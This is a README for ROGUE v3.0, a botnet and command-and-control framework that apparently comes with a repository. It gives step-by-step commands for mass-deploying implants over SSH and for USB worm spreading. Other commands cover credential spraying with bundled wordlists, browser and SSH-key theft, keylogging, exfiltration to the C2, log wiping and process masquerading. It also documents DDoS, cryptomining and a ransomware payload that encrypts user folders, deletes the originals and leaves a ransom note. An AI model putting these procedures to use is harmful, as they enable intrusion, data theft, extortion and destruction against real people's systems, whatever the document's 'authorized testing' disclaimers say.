# ROGUE - Botnet w/ integrated c2 v3.0

![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)

## Overview

ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.

** EXTREME WARNING: The File Encryption payload (fileransom.py) is DESTRUCTIVE.** It permanently removes original files. Only use in isolated test environments with proper authorization.

---

##  What's New in v3.0

### **Enhanced Payload Suite**
- **12+ Professional Payloads** for reconnaissance, privilege escalation, and data collection
- **Compound Operations** for automated red team workflows
- **Advanced Stealth** with improved persistence and evasion techniques
- **File Encryption Payload** - AES-256 encryption/decryption with password protection (⚠️ DESTRUCTIVE)

### **Modern Web Interface**
- **Tabbed Interface** for organized operation management
- **Category-Based Operations** (Recon, Persistence, Collection, etc.)
- **Real-time Results Viewer** with command history
- **Payload Management System** with direct load/run capabilities
- **File Encryption Tool** - Dedicated interface with safety warnings

### **Professional Features**
- **Implant Self-Update** - Update implants from C2
- **Health Monitoring** - Real-time implant status checking
- **Forensic Cleanup** - Automated log cleaning and trace removal
- **DNS Tunneling** - Covert C2 channel via DNS queries
- **File Encryption** - AES-256 encryption with password recovery

---

##  Installation & Setup

### **Clone Repository**
```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

### **Install Dependencies**
```bash
# Core dependencies
sudo apt update
sudo apt install python3 python3-pip python3-dev python3-venv -y

# Install Python packages
pip3 install pycryptodome flask requests psutil setproctitle netifaces --break-system-packages

# Optional dependencies for enhanced payloads
pip3 install paramiko pynput pyautogui python-nmap secretstorage --break-system-packages

```

**Note:** If you don't want to use `--break-system-packages`, use a virtual environment:
```bash
python3 -m venv rogue_env
source rogue_env/bin/activate
pip3 install pycryptodome flask requests psutil setproctitle netifaces paramiko pynput
```

### **Ngrok Setup**
```bash
# Download and install ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

# Set up authentication
ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
```

---

##  Quick Start Guide

### **1. Start C2 Server** (Control Center)
```bash
python3 rogue_c2.py
```

**Expected Output:**
```
============================================================
 ROGUE C2 SERVER - Complete Command & Control
============================================================
[✓] Exfil listener started on port 9091
[✓] Reverse shell listener started on port 9001
[*] Starting ngrok tunnel...
[✓] C2 SERVER IS LIVE!
[NGROK] C2 URL: https://your-subdomain.ngrok-free.dev
[NGROK] Hostname: your-subdomain.ngrok-free.dev
[NGROK] Payloads: https://your-subdomain.ngrok-free.dev/payloads/
[ADMIN] Web Panel: http://localhost:4444/admin
============================================================
```

### **2. Configure Implant**
Edit `rogue_implant.py` with your C2 details:
```python
C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
C2_PORT = 4444
PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
```

### **3. Deploy Implants**

**Manual Deployment:**
```bash
python3 rogue_implant.py
```

**Mass Deployment (SSH):**
```bash
for ip in $(cat targets.txt); do
    scp rogue_implant.py user@$ip:/tmp/ && \
    ssh user@$ip "cd /tmp && python3 rogue_implant.py &"
done
```

**USB Worm Propagation:**
- Insert USB drive into infected system
- Implant auto-copies to USB as `.rogue_worm/`
- Plug USB into new system to infect

---

##  Web Interface Guide

### **Access Control Panel**
```
http://localhost:4444/admin
```

### **Interface Layout**

#### **Tab 1: Active Bots**
- View connected implants with real-time status
- Send commands to individual bots
- Monitor command results and pending queues
- Color-coded status indicators (green = active)
- **File Encryption Tool** - Dedicated interface with warnings

![IMG_1038](https://github.com/user-attachments/assets/68ce8029-3366-49a2-97e9-74e462274015)

#### **Tab 2: Operations**
**Reconnaissance & Intelligence**
```bash
trigger_sysrecon        # Comprehensive system reconnaissance
trigger_linpeas         # Linux privilege escalation checker
trigger_hashdump        # Password hash extraction
trigger_browsersteal    # Browser credential theft
trigger_network_scan    # Network host discovery
```

**Advanced Operations**
```bash
trigger_full_recon      # Complete reconnaissance suite
trigger_harvest_all     # Comprehensive data collection
trigger_clean_sweep     # Forensic cleanup & restart
```

** File Operations (DESTRUCTIVE)**
```bash
trigger_fileransom encrypt /path [password]  # Encrypt files ( removes originals)
trigger_fileransom decrypt /path <password>  # Decrypt files with password
# Quick actions in web interface:
# - Encrypt Documents (/home/user/Documents)
# - Encrypt Downloads (/home/user/Downloads)
# - Encrypt Desktop (/home/user/Desktop)
# - Decrypt Documents (with saved password)
```

**Persistence & Stealth**
```bash
trigger_stealthinject   # PolyRoot persistence installation
trigger_persistence_setup # Additional persistence mechanisms
trigger_defense_evasion  # Anti-forensic techniques
trigger_logclean        # System log cleaning
trigger_logclean all    # Aggressive log cleaning
```

**Monitoring & Collection**
```bash
trigger_keylogger       # Start keystroke logging
trigger_keylogger stop  # Stop keylogger
trigger_screenshot      # Periodic screen capture
trigger_screenshot stop # Stop screenshot capture
reverse_shell          # Interactive reverse shell
```

**Lateral Movement**
```bash
trigger_lateral_move    # Automated lateral movement
trigger_autodeploy      # Network auto-deployment
trigger_sshspray        # SSH credential spraying
trigger_dnstunnel       # DNS tunneling C2
trigger_dnstunnel stop  # Stop DNS tunnel
```

**DDoS & Cryptomining**
```bash
trigger_ddos <target> <port> <time>  # DDoS attack
trigger_mine            # Start cryptocurrency miner
trigger_stopmine        # Stop miner
```

**Implant Management**
```bash
trigger_status          # Check implant health
trigger_self_update     # Update implant from C2
trigger_help           # Show available commands
trigger_forensics_check # Check for forensic artifacts
```

**Data Exfiltration**
```bash
trigger_exfil /etc      # Exfiltrate system configuration
trigger_exfil /home     # Exfiltrate user directories
trigger_exfil ~/.ssh    # Exfiltrate SSH keys
trigger_dumpcreds       # Dump credentials from common locations
```

#### **Tab 3: Payloads**
- Browse available payloads
- Direct load/run buttons
- Payload descriptions and categories
- Organized by operation type
- **File Encryption** marked with orange warnings

#### **Tab 4: Results**
- Command execution history
- Timestamped results
- Filter by bot ID
- Export capabilities

#### **Tab 5: Server Status**
- Server uptime
- Ngrok tunnel status
- Active bot count
- System resource monitoring

---

##  Payload Reference

### **Core Payloads**

#### **System Reconnaissance** (`sysrecon.py`)
```bash
trigger_sysrecon
```
**Collects:**
- System hardware information
- Network configuration
- User accounts and privileges
- Running processes and services
- Installed software inventory
- Security defenses status

#### **Privilege Escalation** (`linpeas_light.py`)
```bash
trigger_linpeas
```
**Checks:**
- Sudo privileges and misconfigurations
- SUID/SGID binaries
- World-writable files and directories
- Cron job vulnerabilities
- Kernel exploits
- Linux capabilities

#### **Credential Access** (`hashdump.py`)
```bash
trigger_hashdump
```
**Extracts:**
- Linux password hashes (/etc/shadow)
- Windows SAM hashes (if available)
- SSH private/public keys
- Browser saved credentials
- Memory credential artifacts

#### **Browser Data Theft** (`browserstealer.py`)
```bash
trigger_browsersteal
```
**Targets:**
- Firefox: logins, cookies, history, bookmarks
- Chrome/Chromium: saved passwords, autofill data
- Edge/Brave: credentials and browsing data
- Safari: keychain and browsing history

#### **Monitoring Payloads**
```bash
trigger_keylogger       # Real-time keystroke logging
trigger_screenshot      # Periodic screen capture (every 60s)
```

#### **Defense Evasion** (`logcleaner.py`)
```bash
trigger_logclean        # Clean implant traces
trigger_logclean all    # Aggressive system log cleaning
```

#### ** File Encryption** (`fileransom.py`) - **DESTRUCTIVE**
```bash
trigger_fileransom encrypt /path [password]  # Encrypt files
trigger_fileransom decrypt /path <password>  # Decrypt files
```
**Features:**
- AES-256 military-grade encryption
- Password-protected encryption/decryption
- Auto-generates strong passwords
- Creates ransom note with recovery instructions
- Saves encryption log with password
- **WARNING:** Removes original files permanently

**Safety Notes:**
1. Only use in isolated test environments
2. Always test in `/tmp` directory first
3. Save the encryption password from results
4. Original files are NOT recoverable without password

#### **Lateral Movement** (`sshspray.py`)
```bash
trigger_sshspray <target> <userlist> <passlist>
```
**Features:**
- Multi-threaded SSH authentication attempts
- Common credential dictionary
- Success/failure reporting
- Session persistence

#### **Covert C2** (`dnstunnel.py`)
```bash
trigger_dnstunnel       # Start DNS tunneling
```
**Uses DNS queries for:**
- Command delivery
- Data exfiltration
- C2 communication bypassing firewalls

---

##  Configuration Files for Lateral Movement

### **Purpose**
These files are used by the **SSH credential sprayer (`sshspray.py`)** and **auto-deploy (`autodeploy.py`)** payloads for automated lateral movement and network propagation.

### **File Formats & Examples**

#### **1. `targets.txt` - Target IP Addresses/Ranges**
```txt
# Single IP addresses
192.168.1.100
192.168.1.101
192.168.1.102

# IP ranges
192.168.1.1-50
10.0.0.1-255

# CIDR notation
192.168.1.0/24
10.0.0.0/16

# Hostnames (if DNS is available)
server1.example.com
server2.local
```

#### **2. `users.txt` - Username Dictionary**
```txt
# Common Linux usernames
root
admin
ubuntu
debian
centos
user
test
guest
pi
administrator
sysadmin
backup
oracle
postgres
mysql
www-data
nobody

# Add specific usernames from reconnaissance
alice
bob
charlie
david

# Pattern-based usernames
user1
user2
user3
admin1
admin2
```

#### **3. `passwords.txt` - Password Dictionary**
```txt
# Top passwords
password
123456
admin
password123
qwerty
12345678
12345
123456789
letmein
welcome
monkey
dragon
baseball
football
hello

# Common default credentials
admin:admin
root:toor
ubuntu:ubuntu
pi:raspberry

# Empty password
[blank]

# Pattern-based
Password1
Admin123
Test123
```

### **Usage Examples**

#### **Manual SSH Spray Attack**
```bash
# From C2 web interface:
trigger_sshspray 192.168.1.100 users.txt passwords.txt

# Or manually:
python3 ~/.cache/.rogue/sshspray.py 192.168.1.100 users.txt passwords.txt
```

#### **Auto-Deploy to Network**
```bash
# From C2 web interface:
trigger_autodeploy

# This will:
# 1. Read targets.txt for IP ranges
# 2. Scan for open SSH ports (22)
# 3. Try users.txt usernames with passwords.txt
# 4. Deploy implant on successful login
```

#### **Custom SSH Spray Command**
```bash
# Spray specific target with custom lists
trigger_sshspray 10.0.0.50 custom_users.txt custom_passwords.txt

# Spray entire subnet
trigger_sshspray 192.168.1.0/24 users.txt passwords.txt
```

### **Advanced Configuration**

#### **Creating Custom Lists from Reconnaissance**
```bash
# Extract usernames from /etc/passwd on compromised systems
cat /etc/passwd | cut -d: -f1 > discovered_users.txt

# Extract common passwords from system
find /home -name "*.txt" -o -name "*.doc" -o -name "*.pdf" | xargs grep -i "password\|passwd\|pwd" 2>/dev/null | head -20

# Create targeted password list based on organization
echo "CompanyName2024" >> passwords.txt
echo "SeasonYear!" >> passwords.txt  # e.g., Summer2024!
```

#### **Smart Target List Generation**
```bash
# Generate target list from network scan
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | cut -d" " -f2 > targets.txt

# Combine multiple networks
echo "192.168.1.1-254" > targets.txt
echo "10.0.0.1-100" >> targets.txt
echo "172.16.0.1-50" >> targets.txt
```

### **Best Practices**

1. **Start Small**: Begin with limited targets and credentials
2. **Use Rate Limiting**: Avoid account lockouts
3. **Log Everything**: Keep records of attempts and successes
4. **Update Regularly**: Add new credentials from compromised systems
5. **Legal Compliance**: Only use on authorized systems

### **Integration with Other Payloads**

These files can also be used by:
- **Network Scanner**: `targets.txt` for scan ranges
- **Auto-Deploy**: All three files for automated propagation
- **Custom Scripts**: As input for other lateral movement tools

### **File Management Commands**
```bash
# View current configuration
ls -la ~/rogue/payloads/*.txt

# Count entries
wc -l ~/rogue/payloads/targets.txt
wc -l ~/rogue/payloads/users.txt
wc -l ~/rogue/payloads/passwords.txt

# Test file formatting
head -10 ~/rogue/payloads/targets.txt
head -10 ~/rogue/payloads/users.txt
head -10 ~/rogue/payloads/passwords.txt

# Clean up empty lines and comments
sed -i '/^$/d' ~/rogue/payloads/targets.txt
sed -i '/^#/d' ~/rogue/payloads/targets.txt
```

---

##  File Encryption Usage Guide

### **Safety First - Critical Warnings**
**⚠️ THE FILE ENCRYPTION PAYLOAD IS DESTRUCTIVE ⚠️**
- Original files are **permanently removed** after encryption
- Files are only recoverable with the correct password
- Always test in isolated environments first
- Keep backups of encryption passwords

### **Recommended Testing Procedure**
1. **Create test environment:**
   ```bash
   mkdir -p /tmp/test_encryption
   cd /tmp/test_encryption
   echo "Test file 1" > document1.txt
   echo "Test file 2" > document2.txt
   ```

2. **Test encryption (from C2 web interface):**
   - Select target bot
   - Choose "Encrypt /tmp (Test)" from dropdown
   - Or use custom form: `/tmp/test_encryption`
   - Click "Execute File Encryption"

3. **Verify encryption worked:**
   ```bash
   ls -la /tmp/test_encryption/*.encrypted
   cat /tmp/test_encryption/README_FOR_DECRYPT.txt
   ```

4. **Test decryption:**
   - Copy password from results or ransom note
   - Use custom form: Action="decrypt", Path="/tmp/test_encryption", Password="[your-password]"
   - Click "Execute File Encryption"

### **Web Interface Features**
- **Orange warning boxes** for high visibility
- **Confirmation dialogs** before destructive operations
- **Quick action buttons** for common paths
- **Custom form** for any path/password combination
- **Password field** (optional for encryption, required for decryption)

### **Command Line Usage**
```bash
# Encrypt Documents with auto-generated password
trigger_fileransom encrypt /home/user/Documents

# Encrypt with custom password
trigger_fileransom encrypt /home/user/Downloads MyCustomPass123!

# Decrypt files
trigger_fileransom decrypt /home/user/Documents MyCustomPass123!

# Test in temporary directory
trigger_fileransom encrypt /tmp/test_dir
```

### **Password Recovery**
The encryption password is:
1. Displayed in the command results
2. Saved in `~/.cache/.rogue/encryption_log.json`
3. Included in `README_FOR_DECRYPT.txt` in encrypted directories
4. Can be retrieved via: `trigger_fileransom decrypt /path [password]`

### **Troubleshooting File Encryption**
```bash
# Check if files were encrypted
find /path -name "*.encrypted" | head -5

# Check for ransom note
find /path -name "README_FOR_DECRYPT.txt"

# Check encryption log
cat ~/.cache/.rogue/encryption_log.json 2>/dev/null | python3 -m json.tool

# Manual decryption test
python3 ~/.cache/.rogue/fileransom.py decrypt /path [password]
```

---

##  Advanced Usage

### **Compound Operations**

#### **Full Reconnaissance Suite**
```bash
trigger_full_recon
```
**Executes sequentially:**
1. System reconnaissance
2. Privilege escalation checks
3. Password hash extraction
4. Network scanning

#### **Complete Data Harvest**
```bash
trigger_harvest_all
```
**Collects:**
1. Browser credentials and data
2. System password hashes
3. SSH keys and certificates
4. Configuration files
5. User documents and downloads

#### **Clean Sweep Operation**
```bash
trigger_clean_sweep
```
**Performs:**
1. System log cleaning
2. Defense evasion techniques
3. Implant restart in stealth mode
4. Forensic artifact removal

### **Implant Management**

#### **Health Checking**
```bash
trigger_status
```
**Reports:**
- Implant ID and C2 connectivity
- System resource usage
- Process stealth status
- Available payloads
- Uptime and beacon count

#### **Remote Update**
```bash
trigger_self_update
```
- Downloads latest implant from C2
- Replaces current version
- Maintains persistence
- Preserves configuration

### **Data Exfiltration**

#### **Targeted Exfiltration**
```bash
trigger_exfil /path/to/target
```
**Common targets:**
- `/etc` - System configuration
- `/home` - User directories
- `/var/log` - System logs
- `~/.ssh` - SSH keys and configs
- `~/Documents` - User documents

#### **Credential Dumping**
```bash
trigger_dumpcreds
```
**Targets default locations:**
- `~/Documents`
- `~/Downloads`
- `~/Pictures`
- `~/Desktop`
- `~/.ssh`

---

##  Stealth & Persistence

### **Silent Operation Modes**

**Manual Execution** (Visible for debugging):
```bash
python3 rogue_implant.py
# Shows beacon activity and command execution
```

**Persistence Mode** (Completely silent):
- Auto-starts from `.bashrc` on login
- No terminal output
- Output redirected to `~/.cache/.rogue/.implant.log`
- Process masquerades as `systemd-journald`

### **Persistence Mechanisms**

1. **Bashrc Injection** - Primary persistence
2. **Systemd Service** - Service-based persistence (optional)
3. **Cron Jobs** - Scheduled execution
4. **USB Worm** - Removable drive propagation
5. **PolyRoot** - Privileged persistence via SUID

### **Defense Evasion**

**Log Cleaning:**
```bash
trigger_logclean        # Clean implant-specific logs
trigger_logclean all    # Clean all suspicious entries
```

**Process Hiding:**
- Masquerades as `systemd-journald`
- Randomizes check-in intervals
- Uses encrypted communications
- Implements P2P fallback channels

---

##  C2 Communication

### **Primary Channel (HTTPS)**
- Encrypted AES-256 communication
- 30-second beacon interval
- Automatic reconnection
- Command queuing system

### **Fallback Channels**

**Discord:**
- Commands via Discord channel messages
- Results via webhook
- Useful when HTTPS blocked

**P2P Network:**
- Bot-to-bot communication
- UDP broadcast on ports 7008-7011
- Command relay capability

**DNS Tunneling:**
- Covert channel via DNS queries
- Bypasses network restrictions
- Slower but highly stealthy

---

##  Emergency Procedures

### **Implant Removal from Target**
```bash
# Quick removal (recommended)
sudo pkill -9 -f rogue && sudo rm -rf ~/.cache/.rogue && \
sed -i '/ROGUE\|rogue_agent\|systemd-journald/d' ~/.bashrc ~/.profile ~/.bash_profile && \
echo "✓ Rogue removed"

# Verification
ps aux | grep -E "rogue|\.rogue" | grep -v grep || echo "System clean"
ls -la ~/.cache/.rogue/ 2>/dev/null || echo "No hidden directory"
```

### **C2 Server Shutdown**
```bash
# Graceful shutdown
pkill -f "python3 rogue_c2.py"
pkill -f "ngrok"
rm -f exfil_*.zip exfil_*.bin

# Clean restart
./cleanup.sh  # Optional cleanup script
```

### **Forensic Cleanup**
```bash
# Remove all traces
trigger_clean_sweep        # From C2 panel
# OR
trigger_logclean all      # Aggressive log cleaning
```

### **File Encryption Emergency Recovery**
If you lose an encryption password:
1. Check `~/.cache/.rogue/encryption_log.json` on target
2. Look for `README_FOR_DECRYPT.txt` in encrypted directories
3. Check C2 command history for password in results
4. If password is truly lost, files cannot be recovered

---

##  Troubleshooting

### **Common Issues & Solutions**

**Ngrok Connection Issues:**
```bash
# Check ngrok status
curl http://localhost:4040/api/tunnels

# Restart ngrok
pkill ngrok
ngrok http 4444
sleep 5
```

**Implant Not Connecting:**
```bash
# Test C2 connectivity from target
curl -k https://your-c2.ngrok-free.dev

# Check implant logs
cat ~/.cache/.rogue/.implant.log 2>/dev/null

# Verify payload delivery
curl -k https://your-c2.ngrok-free.dev/payloads/test.py
```

**Web Interface Issues:**
```bash
# Check Flask is running
netstat -tlnp | grep 4444

# Check for port conflicts
sudo lsof -i :4444

# Restart C2 server
pkill -f "python3 rogue_c2.py"
python3 rogue_c2.py
```

**Payload Execution Errors:**
```bash
# Check dependencies
pip3 install psutil netifaces paramiko pynput

# Verify Python version
python3 --version

# Check file permissions
chmod +x payloads/*.py
```

**File Encryption Issues:**
```bash
# Check if pycryptodome is installed
python3 -c "import Cryptodome; print('Cryptodome available')"

# Test encryption manually
python3 payloads/fileransom.py encrypt /tmp/test

# Check for disk space
df -h /tmp
```

### **Log Files & Diagnostics**

**C2 Server Logs:**
- Console output during startup
- Flask application logs
- Exfiltration processing logs

**Implant Logs:**
- `~/.cache/.rogue/.implant.log` (silent mode)
- Console output (manual mode)
- Beacon activity and command results

**Network Diagnostics:**
```bash
# Test C2 connectivity
ping your-c2.ngrok-free.dev
nc -zv your-c2.ngrok-free.dev 443
curl -k -I https://your-c2.ngrok-free.dev

# Test exfiltration port
nc -zv your-c2.ngrok-free.dev 9091
```

---

##  Command Quick Reference

### **Essential Commands**
```bash
# System Information
whoami
uname -a
ip a
ps aux

# File Operations
ls -la /home
find / -type f -name "*.conf" 2>/dev/null | head -20
cat /etc/passwd

# Network Operations
netstat -tunap
ss -tunap
arp -a
```

### **Trigger Commands (C2 Panel)**
```bash
# Reconnaissance
trigger_sysrecon
trigger_linpeas
trigger_hashdump
trigger_browsersteal

# File Operations (⚠️ DESTRUCTIVE)
trigger_fileransom encrypt /path [password]
trigger_fileransom decrypt /path <password>

# Operations
trigger_full_recon
trigger_harvest_all
trigger_clean_sweep

# Persistence
trigger_stealthinject
trigger_persistence_setup
trigger_defense_evasion

# Monitoring
trigger_keylogger
trigger_screenshot
reverse_shell

# Management
trigger_status
trigger_self_update
trigger_help
```

### **Payload Commands**
```bash
# Load and execute
load_payload sysrecon.py
run_payload sysrecon.py

# Direct execution
python3 ~/.cache/.rogue/sysrecon.py

# File Encryption (⚠️ use with extreme caution)
load_payload fileransom.py
run_payload fileransom.py
```

---

##  License & Disclaimer

### **License**
This project is released for educational purposes only. Users assume all responsibility for legal compliance.

### ** EXTREME WARNING DISCLAIMER**
```
THE FILE ENCRYPTION PAYLOAD (fileransom.py) IS DESTRUCTIVE SOFTWARE.
It PERMANENTLY REMOVES ORIGINAL FILES during encryption.
Files are only recoverable with the correct password.

THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
The author assumes NO LIABILITY for data loss, misuse, or damage caused by this software.

Users must:
1. Obtain proper authorization before use
2. Only use in isolated test environments
3. Maintain backups of all important data
4. Assume full responsibility for encryption password management

Unauthorized use of this software, particularly the file encryption capabilities,
may constitute computer fraud, data theft, or ransomware attacks under applicable laws.
```

![rogue](https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520)

---
*Last Updated: v3.0 | For authorized security testing only*  
**⚠️ FILE ENCRYPTION: Use with extreme caution in isolated environments only**
